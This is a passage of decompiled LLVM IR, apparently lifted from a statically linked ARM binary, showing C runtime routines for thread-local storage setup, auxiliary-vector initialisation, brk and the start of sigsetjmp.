.thread1:                                         ; preds = %dec_label_pc_16258, %bb
  %v8_16260 = phi i32 [ %tmp, %dec_label_pc_16258 ], [ %v7_16260, %bb ]
  ret i32 %v8_16260

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1626c = call i32 @__aeabi_read_tp()
  %v1_16270 = inttoptr i32 %v0_1626c to i32*
  %v2_16270 = load i32, i32* %v1_16270, align 4
  %v1_16274 = add i32 %arg1, 4
  %v2_16274 = inttoptr i32 %v1_16274 to i32*
  %v3_16274 = load i32, i32* %v2_16274, align 4
  %v1_16278 = add i32 %v2_16270, 8
  %v2_16278 = inttoptr i32 %v1_16278 to i32*
  %v3_16278 = load i32, i32* %v2_16278, align 4
  %v2_1627c = add i32 %v3_16278, %v3_16274
  ret i32 %v2_1627c
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16288 = load i32, i32* @r4, align 4
  store i32 %v3_16288, i32* %stack_var_-36, align 4
  %v6_16288 = load i32, i32* @r5, align 4
  %v15_16288 = load i32, i32* @r8, align 4
  %v18_16288 = load i32, i32* @sb, align 4
  %v21_16288 = load i32, i32* @sl, align 4
  %v24_16288 = load i32, i32* @fp, align 4
  %v27_16288 = load i32, i32* @lr, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %sl.global-to-local, align 4
  %v4_16298 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 104) to i32*), align 4
  store i32 %v4_16298, i32* %r3.global-to-local, align 4
  %v1_1629c = inttoptr i32 %v4_16298 to i32*
  %v2_1629c = load i32, i32* %v1_1629c, align 4
  store i32 %v2_1629c, i32* %r2.global-to-local, align 4
  %v2_162a0 = icmp eq i32 %v2_1629c, 0
  %v0_162a8 = load i32, i32* %r0.global-to-local, align 4
  %v0_162ac = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_162ac, i32* %ip.global-to-local, align 4
  br i1 %v2_162a0, label %dec_label_pc_16474, label %dec_label_pc_162b4

dec_label_pc_162b4:                               ; preds = %entry
  store i32 156, i32* %r3.global-to-local, align 4
  %v4_162b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 156) to i32*), align 4
  store i32 %v4_162b8, i32* @lr, align 4
  store i32 %v2_1629c, i32* %r1.global-to-local, align 4
  %v1_16300 = inttoptr i32 %v4_162b8 to i32*
  %v2_1630061 = load i32, i32* %v1_16300, align 4
  %v4_1630462 = mul i32 %v2_1630061, 32
  %v5_1630463 = add i32 %v4_1630462, %v2_1629c
  store i32 %v5_1630463, i32* %r3.global-to-local, align 4
  %v3_1630865 = icmp ult i32 %v2_1629c, %v5_1630463
  br i1 %v3_1630865, label %dec_label_pc_162c4, label %dec_label_pc_16474.loopexit

dec_label_pc_162c4:                               ; preds = %dec_label_pc_162b4, %dec_label_pc_162fc
  %v0_162dc66 = phi i32 [ %v1_162fc, %dec_label_pc_162fc ], [ %v2_1629c, %dec_label_pc_162b4 ]
  %v1_162c4 = inttoptr i32 %v0_162dc66 to i32*
  %v2_162c4 = load i32, i32* %v1_162c4, align 4
  store i32 %v2_162c4, i32* %r3.global-to-local, align 4
  %v7_162c8 = icmp eq i32 %v2_162c4, 7
  br i1 %v7_162c8, label %dec_label_pc_162d0, label %dec_label_pc_162fc

dec_label_pc_162d0:                               ; preds = %dec_label_pc_162c4
  %v1_162d0 = add i32 %v0_162dc66, 20
  %v2_162d0 = inttoptr i32 %v1_162d0 to i32*
  %v3_162d0 = load i32, i32* %v2_162d0, align 4
  store i32 %v3_162d0, i32* %r3.global-to-local, align 4
  %v1_162d4 = add i32 %v0_162dc66, 28
  %v2_162d4 = inttoptr i32 %v1_162d4 to i32*
  %v3_162d4 = load i32, i32* %v2_162d4, align 4
  store i32 %v3_162d4, i32* @r6, align 4
  %v1_162dc = add i32 %v0_162dc66, 16
  %v2_162dc = inttoptr i32 %v1_162dc to i32*
  %v3_162dc = load i32, i32* %v2_162dc, align 4
  store i32 %v3_162dc, i32* %r3.global-to-local, align 4
  %v1_162e0 = add i32 %v0_162dc66, 8
  %v2_162e0 = inttoptr i32 %v1_162e0 to i32*
  %v3_162e0 = load i32, i32* %v2_162e0, align 4
  store i32 %v3_162e0, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_162d4, %v0_162ac
  %v0_162ac.v3_162d4 = select i1 %tmp78, i32 %v0_162ac, i32 %v3_162d4
  store i32 %v0_162ac.v3_162d4, i32* %fp.global-to-local, align 4
  %v2_16318 = icmp eq i32 %v3_162d4, 0
  br i1 %v2_16318, label %dec_label_pc_16340, label %bb

dec_label_pc_162fc:                               ; preds = %dec_label_pc_162c4
  %v1_162fc = add i32 %v0_162dc66, 32
  store i32 %v1_162fc, i32* %r1.global-to-local, align 4
  %v2_16300 = load i32, i32* %v1_16300, align 4
  %v4_16304 = mul i32 %v2_16300, 32
  %v5_16304 = add i32 %v4_16304, %v2_1629c
  store i32 %v5_16304, i32* %r3.global-to-local, align 4
  %v3_16308 = icmp ult i32 %v1_162fc, %v5_16304
  br i1 %v3_16308, label %dec_label_pc_162c4, label %dec_label_pc_16300.dec_label_pc_16474.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_162d0
  %v2_1631c = add i32 %v3_162d4, -1
  br label %dec_label_pc_16344

dec_label_pc_16340:                               ; preds = %dec_label_pc_162d0, %dec_label_pc_16474
  %v0_16354.pre = phi i32 [ %v0_16354.pre.pre, %dec_label_pc_16474 ], [ ptrtoint (i32* @global_var_20d14.594 to i32), %dec_label_pc_162d0 ]
  %v1_16344.pre = phi i32 [ %v1_16344.pre.pre, %dec_label_pc_16474 ], [ %v0_162a8, %dec_label_pc_162d0 ]
  %v1_1636825 = phi i32 [ %v0_1647c, %dec_label_pc_16474 ], [ %v0_162ac.v3_162d4, %dec_label_pc_162d0 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_16474 ], [ %v3_162d0, %dec_label_pc_162d0 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_16474 ], [ %v3_162dc, %dec_label_pc_162d0 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_16474 ], [ %v3_162e0, %dec_label_pc_162d0 ]
  br label %dec_label_pc_16344

dec_label_pc_16344:                               ; preds = %bb, %dec_label_pc_16340
  %storemerge80 = phi i32 [ %v2_1631c, %bb ], [ 0, %dec_label_pc_16340 ]
  %v0_16344 = phi i32 [ %v2_1631c, %bb ], [ 0, %dec_label_pc_16340 ]
  %storemerge = phi i32 [ %v3_162d4, %bb ], [ 1, %dec_label_pc_16340 ]
  %storemerge79 = phi i32 [ %v3_162d4, %bb ], [ 1, %dec_label_pc_16340 ]
  %v0_16354 = phi i32 [ ptrtoint (i32* @global_var_20d14.594 to i32), %bb ], [ %v0_16354.pre, %dec_label_pc_16340 ]
  %v1_16344 = phi i32 [ %v0_162a8, %bb ], [ %v1_16344.pre, %dec_label_pc_16340 ]
  %v1_16368 = phi i32 [ %v0_162ac.v3_162d4, %bb ], [ %v1_1636825, %dec_label_pc_16340 ]
  %stack_var_-52.3 = phi i32 [ %v3_162d0, %bb ], [ %stack_var_-52.0, %dec_label_pc_16340 ]
  %stack_var_-48.3 = phi i32 [ %v3_162dc, %bb ], [ %stack_var_-48.0, %dec_label_pc_16340 ]
  %stack_var_-44.3 = phi i32 [ %v3_162e0, %bb ], [ %stack_var_-44.0, %dec_label_pc_16340 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_16344 = add i32 %v1_16344, %v0_16344
  %v2_16348 = udiv i32 %v2_16344, %storemerge
  store i32 %v2_16348, i32* %r0.global-to-local, align 4
  %v2_1634c = mul i32 %v2_16348, %storemerge
  store i32 %v2_1634c, i32* %sb.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_16354 = add i32 %v0_16354, 72
  %v3_16354 = inttoptr i32 %v2_16354 to i32*
  %v4_16354 = load i32, i32* %v3_16354, align 4
  store i32 %v4_16354, i32* %r3.global-to-local, align 4
  %v1_16358 = inttoptr i32 %v4_16354 to i32*
  %v2_16358 = load i32, i32* %v1_16358, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_16360 = add i32 %v1_16368, 1168
  %v2_16364 = add i32 %v1_16360, %stack_var_-52.3
  %v2_16368 = add i32 %v2_16364, %v2_1634c
  %v2_1636c = add i32 %v2_16368, %v2_16358
  store i32 %v2_1636c, i32* %r0.global-to-local, align 4
  %v1_16370 = call i32 @__GI_sbrk(i32 %v2_1636c)
  %v1_16374 = load i32, i32* %fp.global-to-local, align 4
  %v1_1637c = sub i32 0, %v1_16374
  store i32 10232, i32* %r4.global-to-local, align 4
  %v2_16374 = add i32 %v1_16370, 1167
  %v1_16384 = add i32 %v2_16374, %v1_16374
  %v2_16388 = and i32 %v1_16384, %v1_1637c
  store i32 %v2_16388, i32* @r5, align 4
  %v1_16390 = load i32, i32* %sl.global-to-local, align 4
  %v3_16390 = add i32 %v1_16390, 10232
  %v4_16390 = inttoptr i32 %v3_16390 to i32*
  store i32 62, i32* %v4_16390, align 4
  %v0_16398 = load i32, i32* @r5, align 4
  %v1_16398 = load i32, i32* %sb.global-to-local, align 4
  %v2_16398 = add i32 %v1_16398, %v0_16398
  store i32 %v2_16398, i32* @ip, align 4
  %v0_1639c = load i32, i32* %sl.global-to-local, align 4
  %v1_1639c = load i32, i32* %r4.global-to-local, align 4
  %v2_1639c = add i32 %v1_1639c, %v0_1639c
  store i32 %v2_1639c, i32* %r4.global-to-local, align 4
  %v2_163a0 = add i32 %v0_1639c, 11520
  store i32 %v2_163a0, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_16398, i32* @r0, align 4
  %v2_163b4 = add i32 %v2_1639c, 16
  %v3_163b4 = inttoptr i32 %v2_163b4 to i32*
  store i32 %v2_16398, i32* %v3_163b4, align 4
  %v0_163b8 = load i32, i32* %sb.global-to-local, align 4
  %v1_163b8 = load i32, i32* %r8.global-to-local, align 4
  %v2_163b8 = add i32 %v1_163b8, 40
  %v3_163b8 = inttoptr i32 %v2_163b8 to i32*
  store i32 %v0_163b8, i32* %v3_163b8, align 4
  %v0_163bc = load i32, i32* @r3, align 4
  %v1_163bc = trunc i32 %v0_163bc to i8
  %v2_163bc = load i32, i32* %r4.global-to-local, align 4
  %v3_163bc = add i32 %v2_163bc, 20
  %v4_163bc = inttoptr i32 %v3_163bc to i8*
  store i8 %v1_163bc, i8* %v4_163bc, align 1
  %v0_163c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_163c0 = add i32 %v0_163c0, 8
  store i32 %v1_163c0, i32* @r4, align 4
  %v0_163c4 = call i32 @memcpy()
  %v0_163cc = load i32, i32* @r4, align 4
  %v1_163cc = load i32, i32* @r5, align 4
  %v2_163cc = inttoptr i32 %v1_163cc to i32*
  store i32 %v0_163cc, i32* %v2_163cc, align 4
  %v0_163d0 = load i32, i32* @r5, align 4
  store i32 %v0_163d0, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_163d0, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_11d58.758 to i32))
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_163e4 = load i32, i32* %sl.global-to-local, align 4
  %v2_163e4 = add i32 %v0_163e4, 84
  %v3_163e4 = inttoptr i32 %v2_163e4 to i32*
  %v4_163e4 = load i32, i32* %v3_163e4, align 4
  store i32 %v4_163e4, i32* %ip.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 10744, i32* %r1.global-to-local, align 4
  %v2_163f0 = add i32 %v0_163e4, 60
  %v3_163f0 = inttoptr i32 %v2_163f0 to i32*
  %v4_163f0 = load i32, i32* %v3_163f0, align 4
  store i32 %v4_163f0, i32* %r0.global-to-local, align 4
  %v3_163f8 = add i32 %v0_163e4, 10744
  %v4_163f8 = inttoptr i32 %v3_163f8 to i32*
  store i32 64, i32* %v4_163f8, align 4
  %v1_16400 = load i32, i32* %r8.global-to-local, align 4
  %v2_16400 = add i32 %v1_16400, 20
  %v3_16400 = inttoptr i32 %v2_16400 to i32*
  store i32 %stack_var_-44.3, i32* %v3_16400, align 4
  %v1_16408 = load i32, i32* %r8.global-to-local, align 4
  %v2_16408 = add i32 %v1_16408, 24
  %v3_16408 = inttoptr i32 %v2_16408 to i32*
  store i32 %stack_var_-48.3, i32* %v3_16408, align 4
  %v1_16410 = load i32, i32* %r0.global-to-local, align 4
  %v2_16410 = inttoptr i32 %v1_16410 to i32*
  store i32 1, i32* %v2_16410, align 4
  %v1_16418 = load i32, i32* %r8.global-to-local, align 4
  %v2_16418 = add i32 %v1_16418, 28
  %v3_16418 = inttoptr i32 %v2_16418 to i32*
  store i32 %stack_var_-52.3, i32* %v3_16418, align 4
  %v0_16420 = load i32, i32* @r6, align 4
  %v2_16420 = icmp eq i32 %v0_16420, 0
  %v1_16424 = load i32, i32* %r8.global-to-local, align 4
  %v2_16424 = add i32 %v1_16424, 44
  %v3_16424 = inttoptr i32 %v2_16424 to i32*
  store i32 1, i32* %v3_16424, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_1642c = load i32, i32* %sl.global-to-local, align 4
  %v1_1642c = load i32, i32* %r1.global-to-local, align 4
  %v2_1642c = add i32 %v1_1642c, %v0_1642c
  store i32 %v2_1642c, i32* %r2.global-to-local, align 4
  %v1_16430 = load i32, i32* @r6, align 4
  br i1 %v2_16420, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_16344
  store i32 %v1_16430, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1643c34 = load i32, i32* %r8.global-to-local, align 4
  %v2_1643c35 = add i32 %v1_1643c34, 32
  %v3_1643c36 = inttoptr i32 %v2_1643c35 to i32*
  store i32 %v1_16430, i32* %v3_1643c36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_16344
  %v2_16434 = add i32 %v1_16430, -1
  store i32 %v2_16434, i32* %r0.global-to-local, align 4
  %v1_1643c = load i32, i32* %r8.global-to-local, align 4
  %v2_1643c = add i32 %v1_1643c, 32
  %v3_1643c = inttoptr i32 %v2_1643c to i32*
  store i32 %v1_16430, i32* %v3_1643c, align 4
  %v1_16440 = load i32, i32* @r6, align 4
  store i32 %v1_16440, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_16444 = load i32, i32* %r8.global-to-local, align 4
  %v1_16444 = load i32, i32* %r2.global-to-local, align 4
  %v2_16444 = add i32 %v1_16444, 28
  %v3_16444 = inttoptr i32 %v2_16444 to i32*
  store i32 %v0_16444, i32* %v3_16444, align 4
  %v0_16448 = load i32, i32* %r2.global-to-local, align 4
  %v1_16448 = load i32, i32* %ip.global-to-local, align 4
  %v2_16448 = inttoptr i32 %v1_16448 to i32*
  store i32 %v0_16448, i32* %v2_16448, align 4
  %v0_1644c = load i32, i32* %r0.global-to-local, align 4
  %v1_1644c = load i32, i32* %r3.global-to-local, align 4
  %v2_1644c = add i32 %v1_1644c, %v0_1644c
  store i32 %v2_1644c, i32* %r0.global-to-local, align 4
  %v1_16450 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_16420, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_16458.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_16458 = phi i32 [ %v0_16458.pre, %._crit_edge ], [ %v1_16450, %bb54 ]
  %v2_16454 = udiv i32 %v2_1644c, %v1_16450
  %v2_16458 = load i32, i32* %sb.global-to-local, align 4
  %v3_16458 = mul i32 %v2_16454, %v0_16458
  %v4_16458 = add i32 %v2_16458, %v3_16458
  store i32 %v4_16458, i32* @r0, align 4
  %v0_1645c = load i32, i32* %fp.global-to-local, align 4
  %v2_1645c = icmp ult i32 %v0_1645c, 16
  %v0_1645c. = select i1 %v2_1645c, i32 16, i32 %v0_1645c
  store i32 %v0_1645c., i32* @r1, align 4
  %v2_1646c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1646c, i32* @r4, align 4
  store i32 %v6_16288, i32* @r5, align 4
  store i32 %v15_16288, i32* %r8.global-to-local, align 4
  store i32 %v18_16288, i32* %sb.global-to-local, align 4
  store i32 %v21_16288, i32* %sl.global-to-local, align 4
  store i32 %v24_16288, i32* %fp.global-to-local, align 4
  store i32 %v27_16288, i32* @lr, align 4
  %v0_16470 = call i32 @init_static_tls()
  store i32 %v0_16470, i32* %r0.global-to-local, align 4
  %v0_1647c.pre = load i32, i32* @ip, align 4
  %v1_16344.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_16354.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_16474

dec_label_pc_16300.dec_label_pc_16474.loopexit_crit_edge: ; preds = %dec_label_pc_162fc
  br label %dec_label_pc_16474.loopexit

dec_label_pc_16474.loopexit:                      ; preds = %dec_label_pc_16300.dec_label_pc_16474.loopexit_crit_edge, %dec_label_pc_162b4
  br label %dec_label_pc_16474

dec_label_pc_16474:                               ; preds = %dec_label_pc_16474.loopexit, %entry, %bb55
  %v0_16354.pre.pre = phi i32 [ ptrtoint (i32* @global_var_20d14.594 to i32), %dec_label_pc_16474.loopexit ], [ ptrtoint (i32* @global_var_20d14.594 to i32), %entry ], [ %v0_16354.pre.pre.pre, %bb55 ]
  %v1_16344.pre.pre = phi i32 [ %v0_162a8, %dec_label_pc_16474.loopexit ], [ %v0_162a8, %entry ], [ %v1_16344.pre.pre.pre, %bb55 ]
  %v0_1647c = phi i32 [ %v0_162ac, %dec_label_pc_16474.loopexit ], [ %v0_162ac, %entry ], [ %v0_1647c.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_1647c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_16340

; uselistorder directives
  uselistorder i32 %v0_1647c, { 1, 0 }
  uselistorder i32 %v1_16430, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1639c, { 1, 0 }
  uselistorder i32 %v2_16398, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_162fc, { 2, 1, 0 }
  uselistorder i32 %v3_162d4, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_162dc66, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_16300, { 1, 0 }
  uselistorder i32 %v0_162ac, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_162a8, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1629c, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 11, 0, 13, 14, 15 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 0, 10, 9, 3, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 7, 6, 8, 9, 10, 11, 12, 3, 0, 1, 2 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 10744, { 0, 2, 1 }
  uselistorder i32 -4096, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 62, { 1, 2, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_16474, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_16344, { 1, 0 }
  uselistorder label %dec_label_pc_16340, { 1, 0 }
  uselistorder label %dec_label_pc_162c4, { 1, 0 }
}

define i32 @function_16494(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_16494:
  %v0_16494 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16494, label %.thread2, label %.thread7

.thread2:                                         ; preds = %dec_label_pc_16494
  call void @llvm.trap()
  unreachable

.thread7:                                         ; preds = %dec_label_pc_16494
  %tmp = ptrtoint i32* %arg1 to i32
  ret i32 %tmp
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_164c0 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_164c0
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r2.global-to-local, align 4
  %v4_164d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 156) to i32*), align 4
  %v4_164d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 104) to i32*), align 4
  store i32 %v4_164d8, i32* %r1.global-to-local, align 4
  %v1_164dc = add i32 %arg1, 44
  %v2_164dc = inttoptr i32 %v1_164dc to i32*
  %v3_164dc = load i32, i32* %v2_164dc, align 4
  %v1_164e0 = add i32 %arg1, 28
  %v2_164e0 = inttoptr i32 %v1_164e0 to i32*
  %v3_164e0 = load i32, i32* %v2_164e0, align 4
  store i32 %v3_164e0, i32* %r2.global-to-local, align 4
  %v2_164e4 = inttoptr i32 %v4_164d0 to i32*
  store i32 %v3_164dc, i32* %v2_164e4, align 4
  %v0_164e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_164e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_164e8 = inttoptr i32 %v1_164e8 to i32*
  store i32 %v0_164e8, i32* %v2_164e8, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 156) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_164f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_164f4:
  %v0_164f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_164f4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_164f4
  %v1_164f4 = load i32, i32* @ip, align 4
  %v3_164f4 = mul i32 %v1_164f4, %arg1
  %v2_164f8 = load i32, i32* @r8, align 4
  %v4_164f8 = and i32 %v2_164f8, %v3_164f4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_164f4, %bb
  %v5_164f8 = phi i32 [ %arg1, %dec_label_pc_164f4 ], [ %v4_164f8, %bb ]
  ret i32 %v5_164f8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_16504 = add i32 %arg1, 40
  store i32 %v1_16504, i32* %r2.global-to-local, align 4
  %v1_16508 = inttoptr i32 %v1_16504 to i32*
  %v2_16508 = load i32, i32* %v1_16508, align 4
  store i32 %v2_16508, i32* %r2.global-to-local, align 4
  %v3_16508 = add i32 %arg1, 44
  %v4_16508 = inttoptr i32 %v3_16508 to i32*
  %v5_16508 = load i32, i32* %v4_16508, align 4
  store i32 %v5_16508, i32* %r3.global-to-local, align 4
  %v0_1650c = call i32 @__aeabi_read_tp()
  %v1_16510 = inttoptr i32 %v0_1650c to i32*
  %v2_16510 = load i32, i32* %v1_16510, align 4
  store i32 %v2_16510, i32* %r1.global-to-local, align 4
  %v3_16514 = mul i32 %v5_16508, 8
  store i32 %v3_16514, i32* %r3.global-to-local, align 4
  %v1_16518 = load i32, i32* %r2.global-to-local, align 4
  %v2_16518 = add i32 %v1_16518, %v0_1650c
  %v3_1651c = add i32 %v3_16514, %v2_16510
  %v4_1651c = inttoptr i32 %v3_1651c to i32*
  store i32 %v2_16518, i32* %v4_1651c, align 4
  %v0_16520 = load i32, i32* %r3.global-to-local, align 4
  %v1_16520 = load i32, i32* %r1.global-to-local, align 4
  %v2_16520 = add i32 %v1_16520, %v0_16520
  store i32 %v2_16520, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_16528 = add i32 %v2_16520, 4
  %v5_16528 = inttoptr i32 %v4_16528 to i8*
  store i8 1, i8* %v5_16528, align 1
  %v0_1652c = load i32, i32* @r4, align 4
  %v1_1652c = add i32 %v0_1652c, 20
  store i32 %v1_1652c, i32* %r1.global-to-local, align 4
  %v1_16530 = inttoptr i32 %v1_1652c to i32*
  %v2_16530 = load i32, i32* %v1_16530, align 4
  store i32 %v2_16530, i32* @r1, align 4
  %v3_16530 = add i32 %v0_1652c, 24
  %v4_16530 = inttoptr i32 %v3_16530 to i32*
  %v5_16530 = load i32, i32* %v4_16530, align 4
  store i32 %v5_16530, i32* %r2.global-to-local, align 4
  %v5_16534 = call i32 @__GI_mempcpy(i32 %v2_16518, i32 %v2_16530, i32 %v5_16530, i32 1)
  %v0_16538 = load i32, i32* @r4, align 4
  %v1_16538 = add i32 %v0_16538, 28
  store i32 %v1_16538, i32* %r3.global-to-local, align 4
  %v1_1653c = inttoptr i32 %v1_16538 to i32*
  %v2_1653c = load i32, i32* %v1_1653c, align 4
  store i32 %v2_1653c, i32* %r2.global-to-local, align 4
  %v3_1653c = add i32 %v0_16538, 24
  %v4_1653c = inttoptr i32 %v3_1653c to i32*
  %v5_1653c = load i32, i32* %v4_1653c, align 4
  store i32 %v5_1653c, i32* %r3.global-to-local, align 4
  %v2_16540 = sub i32 %v5_1653c, %v2_1653c
  store i32 %v2_16540, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_16548 = inttoptr i32 %v5_16534 to i8*
  %v4_16548 = call i32 @__GI_memset(i8* %v3_16548, i32 0, i32 %v2_16540)
  ret i32 %v4_16548

; uselistorder directives
  uselistorder i32 %v3_16514, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i8 1, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_16598:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 11572) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_165ac = load i32, i32* @r0, align 4
  %v1_165b0 = inttoptr i32 %v0_165ac to i32*
  %v2_165b0 = load i32, i32* @r4, align 4
  store i32 %v2_165b0, i32* %v1_165b0, align 4
  %v3_165b0 = add i32 %v0_165ac, 4
  %v4_165b0 = inttoptr i32 %v3_165b0 to i32*
  %v5_165b0 = load i32, i32* @r5, align 4
  store i32 %v5_165b0, i32* %v4_165b0, align 4
  %v6_165b0 = add i32 %v0_165ac, 8
  %v7_165b0 = inttoptr i32 %v6_165b0 to i32*
  %v8_165b0 = load i32, i32* @r6, align 4
  store i32 %v8_165b0, i32* %v7_165b0, align 4
  %v9_165b0 = add i32 %v0_165ac, 12
  %v10_165b0 = inttoptr i32 %v9_165b0 to i32*
  %v11_165b0 = load i32, i32* @r7, align 4
  store i32 %v11_165b0, i32* %v10_165b0, align 4
  %v12_165b0 = add i32 %v0_165ac, 16
  %v13_165b0 = inttoptr i32 %v12_165b0 to i32*
  %v14_165b0 = load i32, i32* @r8, align 4
  store i32 %v14_165b0, i32* %v13_165b0, align 4
  %v15_165b0 = add i32 %v0_165ac, 20
  %v16_165b0 = inttoptr i32 %v15_165b0 to i32*
  %v17_165b0 = load i32, i32* @sb, align 4
  store i32 %v17_165b0, i32* %v16_165b0, align 4
  %v18_165b0 = add i32 %v0_165ac, 24
  %v19_165b0 = inttoptr i32 %v18_165b0 to i32*
  %v20_165b0 = load i32, i32* @sl, align 4
  store i32 %v20_165b0, i32* %v19_165b0, align 4
  %v21_165b0 = add i32 %v0_165ac, 28
  %v22_165b0 = inttoptr i32 %v21_165b0 to i32*
  %v23_165b0 = load i32, i32* @fp, align 4
  store i32 %v23_165b0, i32* %v22_165b0, align 4
  %v24_165b0 = add i32 %v0_165ac, 32
  %v25_165b0 = inttoptr i32 %v24_165b0 to i32*
